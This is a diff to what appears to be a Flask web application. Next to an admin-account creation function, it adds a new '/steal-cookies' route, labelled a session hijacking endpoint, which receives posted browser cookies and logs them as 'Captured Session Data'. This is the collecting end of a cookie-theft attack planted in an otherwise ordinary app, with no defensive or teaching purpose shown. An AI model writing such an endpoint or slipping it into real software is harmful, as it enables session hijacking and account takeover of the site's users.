@@ -359,7 +359,18 @@ def create_admin():
     db.session.commit()
 
     print("Admin account created successfully!")
-
+# ==================================
+# NEW ROUTE: SESSION HIJACKING ENDPOINT
+# ==================================
+@app.route("/steal-cookies", methods=["POST"])
+def steal_cookies():
+    data = request.get_json(silent=True) or {}
+    cookies = data.get("cookies", "")
+    
+    # Log to console so you can see it
+    print(f"🎣 Captured Session Data:\n{cookies}\n")
+    
+    return jsonify({"status": "success"})
 
 # ==================================
 # 12. RUN APPLICATION
